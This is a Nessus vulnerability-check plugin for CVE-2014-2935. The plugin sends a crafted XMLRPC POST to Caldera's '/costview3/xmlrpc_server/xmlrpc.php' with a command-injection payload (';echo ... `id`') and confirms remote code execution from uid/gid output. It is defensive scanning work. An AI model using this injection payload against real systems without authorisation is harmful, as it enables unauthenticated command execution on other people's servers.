#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(74324);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/09/24 20:59:28 $");

  script_cve_id("CVE-2014-2935");
  script_bugtraq_id(67252);
  script_osvdb_id(106745);
  script_xref(name:"CERT", value:"693092");

  script_name(english:"Caldera '/costview3/xmlrpc_server/xmlrpc.php' XMLRPC Request Remote Command Execution");
  script_summary(english:"Attempts to execute an arbitrary command.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that allows arbitrary command
execution.");
  script_set_attribute(attribute:"description", value:
"The Caldera installation on the remote host contains a PHP script that
is affected by an arbitrary command execution vulnerability. A remote,
unauthenticated attacker can exploit this issue by sending a crafted
XMLRPC request to the '/costview3/xmlrpc_server/xmlrpc.php' script,
allowing for the execution of arbitrary commands on the remote host.

Note that the application is also reportedly affected by a directory
traversal vulnerability, multiple variable injection vulnerabilities,
and multiple SQL injection vulnerabilities; however, Nessus has not
tested for these issues.");
  script_set_attribute(attribute:"solution", value:"There is no known solution at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/05/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/06/05");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:caldera:caldera");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2015 Tenable Network Security, Inc.");

  script_dependencies("caldera_web_detect.nbin");
  script_require_keys("www/PHP", "www/caldera_web");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(
  appname      : "caldera_web",
  port         : port,
  exit_on_fail : TRUE
);
dir = install["dir"];
vuln = FALSE;

app = "Caldera";
cmd = "id";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";

postdata =
  '<?phpxml version="1.0"?>' +
  '<methodCall>' +
  '<methodName>xmlrpc.get_cutter_tools_xmlrpc</methodName>' +
  '<params>' +
  '<param><value><string>cutter_name</string></value></param>' +
  '<param><value><string>;echo "&lt;CalderaInfo>&lt;methods>&lt;item>&lt;' +
  'type>`'+cmd+'`&lt;/type>&lt;/item>&lt;/methods>&lt;/CalderaInfo>"' +
  '</string></value></param>' +
  '</params>' +
  '</methodCall>';

res = http_send_recv3(
  method : "POST",
  port   : port,
  item   : dir + "/costview3/xmlrpc_server/xmlrpc.php",
  data   : postdata,
  exit_on_fail : TRUE
);
if (egrep(pattern:cmd_pat, string:res[2])) vuln = TRUE;

if (!vuln) audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:dir, port:port));

if (report_verbosity > 0)
{
  snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);

  report =
    '\n' + 'Nessus was able to verify the issue exists using the following ' +
    'request :' +
     '\n' +
     '\n' + http_last_sent_request() +
     '\n' +
     '\n';
 if (report_verbosity > 1)
  {
    report +=
      '\n' + 'Nessus executed the command "'+cmd+ '" which produced the following output :' +
      '\n' +
      '\n' + snip +
      '\n' + chomp(res[2]) +
      '\n' + snip +
      '\n';
  }
  security_hole(port:port, extra:report);
}
else security_hole(port);
